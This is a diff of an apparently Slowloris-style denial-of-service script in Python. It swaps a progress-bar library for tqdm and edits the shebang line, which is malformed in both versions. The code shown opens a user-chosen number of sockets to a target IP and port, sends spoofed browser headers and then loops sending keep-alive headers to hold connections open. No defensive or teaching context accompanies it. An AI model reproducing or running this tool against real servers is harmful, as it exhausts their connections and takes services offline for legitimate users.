@@ -1,13 +1,13 @@
-#usr/bin/env python
+#usr/local/bin/python3
 
 import sys
 import random
 import socket
 import time
-from progress.bar import Bar
+from tqdm import tqdm
 
 regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-                    "Accept-language: en-US,en,q=0.5"]
+                    "Accept-language: en-US,en,q=0.5" ]
 
 def init_socket(ip,port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -28,19 +28,16 @@ def main():
     ip = sys.argv[1]
     port = sys.argv[2]
     socket_count= int(sys.argv[3])
-    bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
+    print('\033[1;32;40m Creating Sockets...')
     timer = int(sys.argv[4])
     socket_list=[]
 
-    for _ in range(int(socket_count)):
+    for i in tqdm(range(int(socket_count))):
         try:
             s=init_socket(ip,port)
         except socket.error:
             break
         socket_list.append(s)
-        next(bar)
-
-    bar.finish()
 
     while True:
         print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
